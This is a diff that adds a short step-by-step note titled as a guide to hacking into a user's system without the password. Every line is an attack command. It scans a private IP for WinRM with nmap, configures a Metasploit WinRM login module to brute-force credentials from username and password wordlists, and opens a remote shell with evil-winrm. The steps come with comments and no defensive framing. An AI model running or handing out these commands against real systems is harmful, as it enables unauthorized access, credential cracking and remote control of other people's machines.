@@ -1,0 +1,14 @@
+//How to hack into a user's system, without the password
+1. `nmap -p 5985 -sV 192.168.0.185`
+// Could do bruteforce here but it's very messy:
+2. `sudo msfconsole` //start metasploit
+3. msf6 > `search winrm`  //searches for "Windows Remote Management"
+4. `use 3`
+5. `show options`
+6. `set RHOSTS 192.168.0.185  //sets TargetHost
+7. `set USER_FILE /usr/share/wordlists/commonusernames.txt`
+8. `set PASS_FILE /usr/share/wordlists/commonpasswords.txt`
+9. `set STOP_ON_SUCCESS TRUE`
+10. `exploit`  //show incorrect/correct password combos
+11. `evil-winrm -i 192.168.0.185 -u [username] -p [password]`
+//and Boom.
